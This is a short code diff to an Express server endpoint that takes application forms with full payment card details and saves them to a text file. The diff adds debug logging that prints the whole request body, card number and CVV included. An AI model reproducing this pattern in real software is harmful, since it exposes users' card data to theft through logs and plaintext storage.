@@ -16,10 +16,15 @@ const DATA_FILE = path.join(__dirname, 'User_data.txt');
 
 // API to receive application
 app.post('/submit-application', (req, res) => {
+    console.log('=== Received submission ===');
+    console.log('Request body:', req.body);
+
     const { name, email, justification, cardName, cardNumber, expiryDate, cvv, city } = req.body;
 
     // Simple validation
     if (!name || !email || !justification || !cardName || !cardNumber || !expiryDate || !cvv || !city) {
+        console.log('Validation failed - missing fields');
+        console.log({ name, email, justification, cardName, cardNumber, expiryDate, cvv, city });
         return res.status(400).json({ success: false, message: 'All fields are required.' });
     }
 
@@ -45,6 +50,7 @@ Payment Info:
             console.error('Error saving data:', err);
             return res.status(500).json({ success: false, message: 'Internal Server Error' });
         }
+        console.log('Data saved successfully!');
         res.json({ success: true, message: 'Application received. We will contact you shortly.' });
     });
 });
